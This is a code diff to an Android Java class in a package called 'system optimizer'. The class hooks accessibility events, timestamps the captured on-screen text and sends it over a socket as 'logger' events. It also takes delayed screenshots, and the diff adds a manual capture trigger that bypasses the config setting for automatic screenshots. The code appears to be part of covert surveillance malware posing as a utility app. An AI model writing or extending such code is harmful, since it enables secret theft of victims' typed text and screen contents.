@@ -1,13 +1,17 @@
-package com.system.optimizer.handler;
+package com.system.optimizer.event;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
+import java.util.function.BiConsumer;
 
 import android.os.Handler;
 import android.os.Looper;
 
 import com.system.optimizer.network.SocketManager;
+import com.system.optimizer.config.AppConfig;
+import com.system.optimizer.config.ConfigData;
+import com.system.optimizer.service.ScreenshotCallback;
 
 import android.view.accessibility.AccessibilityEvent;
 
@@ -24,22 +28,28 @@ public class AccessibilityEventHandler {
     private static final long DELAY_MS = 2000;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final ScreenshotManager screenshotManager;
+    private final BiConsumer<ScreenshotCallback, Integer> captureProvider;
+    private final AppConfig appConfig;
     private final SocketManager socketManager;
     private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
 
     private String pendingText = "";
     private final Runnable executeRunnable;
+    private boolean isManual = false;
 
-    public AccessibilityEventHandler(ScreenshotManager screenshotManager, SocketManager socketManager) {
-        if (screenshotManager == null) {
-            throw new IllegalArgumentException("ScreenshotManager cannot be null");
+    public AccessibilityEventHandler(BiConsumer<ScreenshotCallback, Integer> captureProvider, AppConfig appConfig, SocketManager socketManager) {
+        if (captureProvider == null) {
+            throw new IllegalArgumentException("Capture provider cannot be null");
+        }
+        if (appConfig == null) {
+            throw new IllegalArgumentException("AppConfig cannot be null");
         }
         if (socketManager == null) {
             throw new IllegalArgumentException("SocketManager cannot be null");
         }
 
-        this.screenshotManager = screenshotManager;
+        this.captureProvider = captureProvider;
+        this.appConfig = appConfig;
         this.socketManager = socketManager;
 
         this.executeRunnable = () -> {
@@ -58,8 +68,15 @@ public class AccessibilityEventHandler {
                 this.socketManager.sendEvent("logger", messageWithTimestamp);
             }
 
-            // Always capture screenshot after delay
-            screenshotManager.takeScreenshot(new ScreenshotManager.ScreenshotCallback() {
+            // Check config before capturing screenshot (only for automatic captures)
+            ConfigData config = appConfig.getConfig();
+            if (!isManual && !config.isAutoScreenshotEnabled()) {
+                socketManager.sendEvent("screenshot_error", "Screenshot disabled in config");
+                return;
+            }
+
+            // Capture screenshot after delay
+            captureProvider.accept(new ScreenshotCallback() {
                 @Override
                 public void onSuccess(byte[] imageData) {
                     if (imageData != null) {
@@ -73,12 +90,12 @@ public class AccessibilityEventHandler {
                 public void onError(String errorMessage) {
                     socketManager.sendEvent("screenshot_error", errorMessage);
                 }
-            }, false); // isManual=false for automatic screenshots
+            }, config.getScreenshotQuality());
         };
     }
 
     /**
-     * Handle accessibility event from AccessibilityLoggerService.
+     * Handle accessibility event from AccessibilityMonitorService.
      */
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null || event.getText() == null) {
@@ -110,6 +127,19 @@ public class AccessibilityEventHandler {
     public void triggerWithText(String text) {
         synchronized (this) {
             pendingText = text;
+            isManual = false;
+        }
+        scheduleExecution();
+    }
+
+    /**
+     * Trigger manual screenshot capture.
+     * This bypasses the auto_screenshot config check.
+     */
+    public void triggerManualCapture() {
+        synchronized (this) {
+            pendingText = "";
+            isManual = true;
         }
         scheduleExecution();
     }
@@ -120,6 +150,7 @@ public class AccessibilityEventHandler {
     public void triggerCaptureOnly() {
         synchronized (this) {
             pendingText = "";
+            isManual = false;
         }
         scheduleExecution();
     }
